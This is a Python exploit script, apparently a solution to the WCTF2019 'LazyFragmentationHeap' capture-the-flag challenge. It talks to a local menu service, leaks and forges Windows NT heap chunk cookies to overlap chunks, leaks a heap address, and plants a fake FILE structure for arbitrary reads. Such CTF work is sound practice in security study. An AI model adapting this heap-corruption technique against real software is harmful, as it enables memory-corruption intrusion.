'''
https://www.nirsoft.net/kernel_struct/vista/iobuf.html
https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html
https://github.com/scwuaptx/LazyFragmentationHeap/blob/master/exp.py
https://labs.bluefrostsecurity.de/blog.html/2022/08/16/windows-segment-heap-attacking-the-vs-allocator/#lsb-technique-overflowing-the-least-significant-byte
https://illmatics.com/Understanding_the_LFH.pdf
https://blog.lamarranet.com/wp-content/uploads/2021/09/WinDbg-Cheat-Sheet.pdf
'''

import socket
import struct
from time import sleep


class Connection:

    def __init__(self):
        self.sock = socket.socket()
        self.sock.connect(("127.0.0.1", 6666))

    def send(self, data: bytes):
        self.sock.send(data)

    def tobytes(self, data: str):
        return bytes(data, "utf-8")

    def recv_until(self, end: str):
        _end = self.tobytes(end)
        buf = b""
        while _end not in buf:
            buf += self.sock.recv(1)
        return buf

    def next(self):
        self.recv_until(":")

    def alloc(self, size: int, id: int):
        self.next()
        self.send(b"1\n")
        self.next()
        self.send(self.tobytes(str(size) + "\n"))
        self.next()
        self.send(self.tobytes(str(id) + "\n"))

    def edit(self, id: int, data: bytes):
        self.next()
        self.send(b"2\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))
        self.next()
        self.send(data)

    def show(self, id: int):
        self.next()
        self.send(b"3\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))
        self.next()
        # buf = self.recv_until("A" * 0x228)
        # return buf

    def free(self, id: int):
        self.next()
        self.send(b"4\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))

    def openFile(self):
        self.next()
        self.send(b"5\n")
        self.next()
        self.send(b"1\n")
        self.next()
        self.send(b"3\n")

    def readFile(self, size: int, id: int):
        self.next()
        self.send(b"5\n")
        self.next()
        self.send(b"2\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))
        self.next()
        self.send(self.tobytes(str(size) + "\n"))
        self.next()
        self.send(b"3\n")


'''
https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version
Slide 20 - slide ...
Heap Chunk header (0x002322010023)
0x0023 - Previous size >> 4
0x22 - SmallTagIndex (first three bytes xor'd together(0x01 ^ 0x00 ^ 0x23))
0x01 -Flag (is chunk in use?????)
0x0023 size of chunk >> 4 (includes 0x8 byte header (0x0000002322010023))

Header is xor'd with _HEAP->encoding
xoring known value with xor'd value gives _HEAP->encoding
'''


def pack32(num):
    return struct.pack("<I", num)


def pack64(num):
    return struct.pack("<Q", num)


def main():
    knownDecodedCookie = 0x2322010023

    conn = Connection()
    input("ree")
    # Leak Heap Cookie
    for i in range(6):
        conn.openFile()
    conn.alloc(0x228, 1)
    conn.alloc(0x228, 2)
    conn.alloc(0x228, 3)
    conn.edit(1, b"A" * 0x228)
    conn.show(1)
    conn.recv_until("A" * 0x228)
    sleep(.1)
    knownEncodedCookie = conn.sock.recv(8)
    knownEncodedCookie = int.from_bytes(
        knownEncodedCookie[:-2].ljust(8, b"\x00"), "little")

    print(hex(knownEncodedCookie))
    heapEncoding = knownEncodedCookie ^ knownDecodedCookie & 0xffffffffffff

    # Create Overlapped Heap Chunk
    conn.alloc(0x268, 4)
    conn.alloc(0x5a0, 5)
    conn.alloc(0x1000, 6)
    conn.alloc(0x280, 7)
    conn.alloc(0x280, 0x12345678)  # cookie ^ 0x37010137)
    conn.openFile()
    conn.readFile(0x268, 4)
    fakeDecodedCookie = 0x27ae0101ae
    fakeEncodeCookie = heapEncoding ^ fakeDecodedCookie
    conn.edit(4, b"A" * 0x268 + struct.pack("<Q", fakeEncodeCookie))
    conn.free(5)

    # Leak Heap Address
    conn.alloc(0x5a0, 5)
    conn.show(6)
    sleep(.1)
    conn.next()
    heap = conn.sock.recv(8)
    print(heap)
    heap = heap[1:][:-1].ljust(8, b"\x00")
    print(heap)
    heap = int.from_bytes(heap, "little")
    print(hex(heap))
    if heap & 0xffff == 0x150:
        print("Gottem")
        heap = heap - 0x150
        print(f"Heap addr: {hex(heap)}")
    elif heap > 0x10000:
        heap = heap & 0xffffffffffff0000
        print("Gottem &")
        print(f"Heap addr: {hex(heap)}")
    else:
        input("heap fucked")

    for _ in range(0x14):
        conn.openFile()

    subsegment = heap + 0x021e80
    reserve = heap + 0x28b40
    size_idx = 0xc
    sig = 0xf0e0d0c0
    fake_userdata = pack64(subsegment) + pack64(reserve) + \
        pack32(size_idx) + pack32(sig)
    fake_userdata += pack64(0)*5
    filebuffer = 0xbeefdad0000
    ptr = filebuffer+0x20
    base = filebuffer+0x20
    cnt = 0
    flag = 0x2049
    fd = 0
    pad = 0
    bufsize = 0x800
    obj = pack64(0)*2 + pack64(ptr) + pack32(cnt) + pack64(base) + \
        pack32(flag) + pack32(fd) + pack32(pad) + pack64(bufsize) + pack64(0)
    obj += pack64(0xffffffffffffffff) + \
        pack32(0xffffffff) + pack32(0) + pack64(0)*2

    conn.edit(6, fake_userdata + obj*0x28)
    print(conn.readFile(1, 8))
    input("end")
    conn.send(b"6\n")


if __name__ == "__main__":
    main()

'''
https://www.nirsoft.net/kernel_struct/vista/iobuf.html
typedef struct _iobuf
    {
        CHAR * _ptr;
        LONG _cnt;
        CHAR * _base;
        LONG _flag;
        LONG _file;
        LONG _charbuf;
        LONG _bufsiz;
        CHAR * _tmpfname;
    } iobuf, *Piobuf;
'''

'''
if ID == 0; ID = 0xddaa

struct heap
{
0x0     0x00000beefdad0000
0x8     0
0x10    0
0x18    0x04
}

0x00000beefdad0000
0x0     0x0000ddaabeef1acd (after alloc)
0x8     slot one size (after alloc)
0x10    slot one ID (after alloc)
0x18    0x0000ddaabeef1acd (after alloc)
0x20    slot one heap alloc addr

0000015d`f7925840
0000015d`f7927960
0000015d`f7927960
'''
